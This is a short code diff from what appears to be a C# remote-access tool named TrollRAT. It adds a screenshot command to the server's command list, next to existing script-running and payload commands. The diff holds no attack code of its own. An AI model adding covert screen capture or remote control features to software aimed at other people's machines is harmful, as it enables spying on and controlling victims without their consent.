@@ -110,6 +110,7 @@ namespace TrollRAT.Server
             commands.Add(new SetCommand(payloads));
 
             commands.Add(new RunScriptCommand());
+            commands.Add(new ScreenshotCommand());
         }
     }
 }
